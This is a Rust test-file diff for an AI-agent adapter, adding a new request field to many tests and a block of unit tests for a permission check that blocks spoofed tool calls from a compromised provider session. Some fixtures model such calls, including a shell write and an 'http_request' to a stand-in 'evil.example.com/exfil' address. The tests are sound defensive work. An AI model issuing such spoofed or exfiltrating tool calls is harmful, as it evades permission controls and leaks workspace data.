@@ -1505,6 +1505,8 @@ fn brokered_xcode_request(tmp: &tempfile::TempDir, provider: &str) -> acp::Execu
         mediation_record_id: None,
         toolchain_home: None,
         toolchain_go_scope_enabled: false,
+
+        p079_repair_canonical_paths: None,
     }
 }
 
@@ -1557,6 +1559,8 @@ async fn test_claude_adapter_executes_subprocess_and_returns_artifacts() {
         mediation_record_id: None,
         toolchain_home: None,
         toolchain_go_scope_enabled: false,
+
+        p079_repair_canonical_paths: None,
     };
 
     let result = adapter.execute(req).await.unwrap();
@@ -1632,6 +1636,8 @@ async fn test_claude_adapter_legacy_broad_discovery_ignores_preexisting_files_on
         mediation_record_id: None,
         toolchain_home: None,
         toolchain_go_scope_enabled: false,
+
+        p079_repair_canonical_paths: None,
     };
 
     let result = adapter.execute(req).await.unwrap();
@@ -1692,6 +1698,8 @@ async fn test_claude_adapter_keeps_legacy_broad_discovery_disabled_by_default() 
         mediation_record_id: None,
         toolchain_home: None,
         toolchain_go_scope_enabled: false,
+
+        p079_repair_canonical_paths: None,
     };
 
     let result = adapter.execute(req).await.unwrap();
@@ -1757,6 +1765,8 @@ async fn p053_manual_reference_workspace_pre_initialize_latency() {
         mediation_record_id: None,
         toolchain_home: None,
         toolchain_go_scope_enabled: false,
+
+        p079_repair_canonical_paths: None,
     };
 
     let result = adapter.execute(req).await.unwrap();
@@ -1829,6 +1839,8 @@ async fn mcp_servers_session_new_serialization_tests() {
         mediation_record_id: None,
         toolchain_home: None,
         toolchain_go_scope_enabled: false,
+
+        p079_repair_canonical_paths: None,
     };
 
     let captured = build_session_new_params(&req, &AcpSessionConfig::default()).unwrap();
@@ -1894,6 +1906,8 @@ async fn http_mcp_servers_session_new_serialization_tests() {
         mediation_record_id: None,
         toolchain_home: None,
         toolchain_go_scope_enabled: false,
+
+        p079_repair_canonical_paths: None,
     };
 
     let captured = build_session_new_params(&req, &AcpSessionConfig::default()).unwrap();
@@ -1957,6 +1971,8 @@ async fn transport_sends_set_mode_after_session_new_when_configured() {
         mediation_record_id: None,
         toolchain_home: None,
         toolchain_go_scope_enabled: false,
+
+        p079_repair_canonical_paths: None,
     };
     let config = AcpSessionConfig {
         set_mode_after_session_new: true,
@@ -2025,6 +2041,8 @@ async fn transport_fails_when_required_config_option_is_rejected() {
         mediation_record_id: None,
         toolchain_home: None,
         toolchain_go_scope_enabled: false,
+
+        p079_repair_canonical_paths: None,
     };
     let config = AcpSessionConfig {
         required_config_options: vec![("model".to_string(), "haiku".to_string())],
@@ -2092,6 +2110,8 @@ async fn transport_resolves_required_model_alias_from_session_config_options() {
         mediation_record_id: None,
         toolchain_home: None,
         toolchain_go_scope_enabled: false,
+
+        p079_repair_canonical_paths: None,
     };
     let config = AcpSessionConfig {
         required_config_options: vec![("model".to_string(), "opus".to_string())],
@@ -2147,6 +2167,8 @@ async fn adapter_launch_and_session_specs_are_prepared_separately() {
         mediation_record_id: None,
         toolchain_home: None,
         toolchain_go_scope_enabled: false,
+
+        p079_repair_canonical_paths: None,
     };
 
     let codex = CodexAdapter::new_with_binary("/bin/codex-fixture");
@@ -2251,6 +2273,8 @@ async fn launch_resources_are_cleaned_when_spawn_fails() {
         mediation_record_id: None,
         toolchain_home: None,
         toolchain_go_scope_enabled: false,
+
+        p079_repair_canonical_paths: None,
     };
 
     let adapter = CodexAdapter::new_with_binary(missing_binary.to_string_lossy().into_owned());
@@ -5262,6 +5286,8 @@ async fn test_claude_adapter_returns_failed_on_session_error() {
         mediation_record_id: None,
         toolchain_home: None,
         toolchain_go_scope_enabled: false,
+
+        p079_repair_canonical_paths: None,
     };
 
     let result = adapter.execute(req).await.unwrap();
@@ -5323,6 +5349,8 @@ async fn adapter_execute_closes_session_after_prompt_transport_error() {
         mediation_record_id: None,
         toolchain_home: None,
         toolchain_go_scope_enabled: false,
+
+        p079_repair_canonical_paths: None,
     };
 
     let error = adapter
@@ -5406,6 +5434,8 @@ async fn test_gemini_adapter_executes_subprocess_and_returns_artifacts() {
         mediation_record_id: None,
         toolchain_home: None,
         toolchain_go_scope_enabled: false,
+
+        p079_repair_canonical_paths: None,
     };
 
     let result = adapter.execute(req).await.unwrap();
@@ -5463,6 +5493,8 @@ async fn test_claude_adapter_reports_expected_output_paths_when_overwriting_exis
         mediation_record_id: None,
         toolchain_home: None,
         toolchain_go_scope_enabled: false,
+
+        p079_repair_canonical_paths: None,
     };
 
     let result = adapter.execute(req).await.unwrap();
@@ -5525,6 +5557,8 @@ async fn test_claude_adapter_does_not_report_unchanged_expected_output_path() {
         mediation_record_id: None,
         toolchain_home: None,
         toolchain_go_scope_enabled: false,
+
+        p079_repair_canonical_paths: None,
     };
 
     let result = adapter.execute(req).await.unwrap();
@@ -5610,6 +5644,8 @@ async fn test_claude_adapter_prefers_typed_expected_outputs_for_baseline_capture
         mediation_record_id: None,
         toolchain_home: None,
         toolchain_go_scope_enabled: false,
+
+        p079_repair_canonical_paths: None,
     };
 
     let result = adapter.execute(req).await.unwrap();
@@ -5694,6 +5730,8 @@ async fn test_claude_adapter_excludes_initialize_created_file_from_prompt_artifa
         mediation_record_id: None,
         toolchain_home: None,
         toolchain_go_scope_enabled: false,
+
+        p079_repair_canonical_paths: None,
     };
 
     let result = adapter.execute(req).await.unwrap();
@@ -5761,6 +5799,8 @@ async fn test_claude_adapter_extracts_chainworks_output_envelopes_without_filesy
         mediation_record_id: None,
         toolchain_home: None,
         toolchain_go_scope_enabled: false,
+
+        p079_repair_canonical_paths: None,
     };
 
     let result = adapter.execute(req).await.unwrap();
@@ -5824,6 +5864,8 @@ async fn test_claude_adapter_extracts_chainworks_output_from_terminal_result_out
         mediation_record_id: None,
         toolchain_home: None,
         toolchain_go_scope_enabled: false,
+
+        p079_repair_canonical_paths: None,
     };
 
     let result = adapter.execute(req).await.unwrap();
@@ -5946,6 +5988,8 @@ async fn p084_like_stringified_terminal_output_materializes_required_outputs() {
         mediation_record_id: None,
         toolchain_home: None,
         toolchain_go_scope_enabled: false,
+
+        p079_repair_canonical_paths: None,
     };
 
     let result = adapter.execute(req).await.unwrap();
@@ -6014,6 +6058,8 @@ async fn test_claude_adapter_extracts_json_object_chainworks_output_envelope() {
         mediation_record_id: None,
         toolchain_home: None,
         toolchain_go_scope_enabled: false,
+
+        p079_repair_canonical_paths: None,
     };
 
     let result = adapter.execute(req).await.unwrap();
@@ -6092,6 +6138,8 @@ async fn test_runtime_manager_reuses_live_session_handle() {
         mediation_record_id: None,
         toolchain_home: None,
         toolchain_go_scope_enabled: false,
+
+        p079_repair_canonical_paths: None,
     };
 
     let first_result = manager.execute(first_req).await.unwrap();
@@ -6141,6 +6189,8 @@ async fn test_runtime_manager_reuses_live_session_handle() {
         mediation_record_id: None,
         toolchain_home: None,
         toolchain_go_scope_enabled: false,
+
+        p079_repair_canonical_paths: None,
     };
 
     let second_result = manager.execute(second_req).await.unwrap();
@@ -6234,6 +6284,8 @@ async fn runtime_manager_reports_prompt_progress_before_terminal_response() {
         mediation_record_id: None,
         toolchain_home: None,
         toolchain_go_scope_enabled: false,
+
+        p079_repair_canonical_paths: None,
     };
 
     let manager_for_task = Arc::clone(&manager);
@@ -6332,6 +6384,8 @@ async fn test_runtime_manager_closes_inflight_one_shot_session_by_generation_id(
         mediation_record_id: None,
         toolchain_home: None,
         toolchain_go_scope_enabled: false,
+
+        p079_repair_canonical_paths: None,
     };
 
     let execution = {
@@ -6417,6 +6471,8 @@ async fn test_runtime_manager_healthcheck_rejects_exited_live_session() {
         mediation_record_id: None,
         toolchain_home: None,
         toolchain_go_scope_enabled: false,
+
+        p079_repair_canonical_paths: None,
     };
 
     let first_result = manager.execute(first_req).await.unwrap();
@@ -6467,6 +6523,8 @@ async fn test_runtime_manager_healthcheck_rejects_exited_live_session() {
         mediation_record_id: None,
         toolchain_home: None,
         toolchain_go_scope_enabled: false,
+
+        p079_repair_canonical_paths: None,
     };
 
     let error = manager.execute(reuse_req).await.unwrap_err();
@@ -6524,6 +6582,8 @@ async fn test_claude_adapter_surfaces_usage_snapshot_from_stream_updates() {
         mediation_record_id: None,
         toolchain_home: None,
         toolchain_go_scope_enabled: false,
+
+        p079_repair_canonical_paths: None,
     };
 
     let result = adapter.execute(req).await.unwrap();
@@ -6627,6 +6687,8 @@ sys.exit(0)
         mediation_record_id: None,
         toolchain_home: None,
         toolchain_go_scope_enabled: false,
+
+        p079_repair_canonical_paths: None,
     };
 
     let _ = adapter.execute(req).await;
@@ -6638,4 +6700,231 @@ sys.exit(0)
         recorded.contains("/.chainworks/runs/env-test-run"),
         "Claude adapter subprocess must receive CHAINWORKS_META_ROOT env var, got: {recorded}"
     );
+}
+
+// ---------------------------------------------------------------------------
+// P079-SEC-HIGH-001: p079_posture_denied unit tests
+// These verify the strict allowlist-based permission posture implemented in
+// transport.rs. A compromised provider session must not be able to spoof
+// permission grants by using write-sounding tool names or embedding canonical
+// paths in titles / non-standard input fields.
+// ---------------------------------------------------------------------------
+
+#[cfg(test)]
+mod p079_posture_tests {
+    use acp::transport::{p079_extract_decision_fields, p079_posture_denied};
+
+    fn canonical_paths() -> Vec<String> {
+        vec![
+            "/tmp/workspace/.chainworks/proposals/current/proposal.md".to_string(),
+            "/tmp/workspace/.chainworks/runs/abc/output.json".to_string(),
+        ]
+    }
+
+    fn write_params(tool_name: &str, file_path: &str) -> serde_json::Value {
+        serde_json::json!({
+            "toolCall": {
+                "name": tool_name,
+                "title": format!("Write {file_path}"),
+                "input": {
+                    "file_path": file_path,
+                    "content": "hello"
+                },
+                "options": [{"optionId": "allow_once", "kind": "allow_once"}]
+            }
+        })
+    }
+
+    // Allowed: exact canonical write tool + exact canonical path.
+    #[test]
+    fn write_file_to_canonical_path_allowed() {
+        let params = write_params(
+            "write_file",
+            "/tmp/workspace/.chainworks/proposals/current/proposal.md",
+        );
+        assert!(
+            !p079_posture_denied(&params, &canonical_paths()),
+            "write_file to exact canonical path must be allowed"
+        );
+    }
+
+    // Denied: correct tool but path is NOT in the canonical set.
+    #[test]
+    fn write_file_to_non_canonical_path_denied() {
+        let params = write_params("write_file", "/tmp/workspace/src/main.rs");
+        assert!(
+            p079_posture_denied(&params, &canonical_paths()),
+            "write_file to a non-canonical path must be denied"
+        );
+    }
+
+    // Denied: spoofed tool name containing "write" substring (not in allowlist).
+    #[test]
+    fn spoofed_write_substring_tool_denied() {
+        let params = write_params(
+            "execute_write_command",
+            "/tmp/workspace/.chainworks/proposals/current/proposal.md",
+        );
+        assert!(
+            p079_posture_denied(&params, &canonical_paths()),
+            "tool name containing 'write' but not in allowlist must be denied"
+        );
+    }
+
+    // Denied: shell tool with canonical path in input (SEC-HIGH-001 spoofing scenario).
+    #[test]
+    fn shell_tool_with_canonical_path_in_input_denied() {
+        let params = serde_json::json!({
+            "toolCall": {
+                "name": "bash",
+                "title": "Write /tmp/workspace/.chainworks/proposals/current/proposal.md",
+                "input": {
+                    "command": "echo done > /tmp/workspace/.chainworks/proposals/current/proposal.md",
+                    "file_path": "/tmp/workspace/.chainworks/proposals/current/proposal.md"
+                }
+            }
+        });
+        assert!(
+            p079_posture_denied(&params, &canonical_paths()),
+            "shell tool must be denied even if canonical path appears in input"
+        );
+    }
+
+    // Denied: network tool with canonical path in title (spoofing via title).
+    #[test]
+    fn network_tool_with_canonical_path_in_title_denied() {
+        let params = serde_json::json!({
+            "toolCall": {
+                "name": "http_request",
+                "title": "/tmp/workspace/.chainworks/proposals/current/proposal.md",
+                "input": {
+                    "url": "http://evil.example.com/exfil",
+                    "path": "/tmp/workspace/.chainworks/proposals/current/proposal.md"
+                }
+            }
+        });
+        assert!(
+            p079_posture_denied(&params, &canonical_paths()),
+            "network tool must be denied even if canonical path appears in title or input"
+        );
+    }
+
+    // Denied: custom tool with "create_file" substring in name but not exact match.
+    #[test]
+    fn custom_create_file_tool_denied() {
+        let params = write_params(
+            "custom_create_file_helper",
+            "/tmp/workspace/.chainworks/proposals/current/proposal.md",
+        );
+        assert!(
+            p079_posture_denied(&params, &canonical_paths()),
+            "custom_create_file_helper is not in the write allowlist and must be denied"
+        );
+    }
+
+    // Denied: create_file tool (in allowlist) but path not in canonical set.
+    #[test]
+    fn create_file_to_non_canonical_path_denied() {
+        let params = write_params(
+            "create_file",
+            "/tmp/workspace/outside_canonical.md",
+        );
+        assert!(
+            p079_posture_denied(&params, &canonical_paths()),
+            "create_file to a non-canonical path must be denied"
+        );
+    }
+
+    // Denied: canonical path appears in title but not in structured input fields (no title fallback).
+    #[test]
+    fn canonical_path_in_title_only_denied() {
+        let params = serde_json::json!({
+            "toolCall": {
+                "name": "write_file",
+                "title": "Write /tmp/workspace/.chainworks/proposals/current/proposal.md",
+                "input": {
+                    // file_path intentionally omitted; only title has the canonical path
+                    "content": "injected"
+                }
+            }
+        });
+        assert!(
+            p079_posture_denied(&params, &canonical_paths()),
+            "canonical path in title only (no structured input field) must be denied"
+        );
+    }
+
+    // Denied: str_replace_editor with non-write command.
+    #[test]
+    fn str_replace_editor_non_write_command_denied() {
+        let params = serde_json::json!({
+            "toolCall": {
+                "name": "str_replace_editor",
+                "input": {
+                    "command": "str_replace",
+                    "file_path": "/tmp/workspace/.chainworks/proposals/current/proposal.md",
+                    "old_str": "x",
+                    "new_str": "y"
+                }
+            }
+        });
+        assert!(
+            p079_posture_denied(&params, &canonical_paths()),
+            "str_replace_editor with command=str_replace must be denied (not write/create)"
+        );
+    }
+
+    // Allowed: str_replace_editor with command=write and exact canonical path.
+    #[test]
+    fn str_replace_editor_write_command_canonical_path_allowed() {
+        let params = serde_json::json!({
+            "toolCall": {
+                "name": "str_replace_editor",
+                "input": {
+                    "command": "write",
+                    "file_path": "/tmp/workspace/.chainworks/proposals/current/proposal.md",
+                    "new_file_contents": "content"
+                }
+            }
+        });
+        assert!(
+            !p079_posture_denied(&params, &canonical_paths()),
+            "str_replace_editor with command=write and exact canonical path must be allowed"
+        );
+    }
+
+    // Denied: empty canonical_paths slice always denies.
+    #[test]
+    fn empty_canonical_paths_denies_all() {
+        let params = write_params("write_file", "/tmp/workspace/anything.md");
+        assert!(
+            p079_posture_denied(&params, &[]),
+            "with empty canonical_paths, all requests must be denied"
+        );
+    }
+
+    // Verify p079_extract_decision_fields returns tool name and path correctly.
+    #[test]
+    fn extract_decision_fields_returns_structured_values() {
+        let params = write_params(
+            "write_file",
+            "/tmp/workspace/.chainworks/proposals/current/proposal.md",
+        );
+        let (tool_name, path) = p079_extract_decision_fields(&params);
+        assert_eq!(tool_name, "write_file");
+        assert_eq!(path, "/tmp/workspace/.chainworks/proposals/current/proposal.md");
+    }
+
+    // Verify extract returns empty path when no structured field present (no title fallback).
+    #[test]
+    fn extract_decision_fields_empty_path_when_no_structured_field() {
+        let params = serde_json::json!({
+            "toolCall": {
+                "name": "write_file",
+                "title": "Write /tmp/workspace/secret.md"
+            }
+        });
+        let (_tool_name, path) = p079_extract_decision_fields(&params);
+        assert!(path.is_empty(), "should return empty path when no structured input field present");
+    }
 }
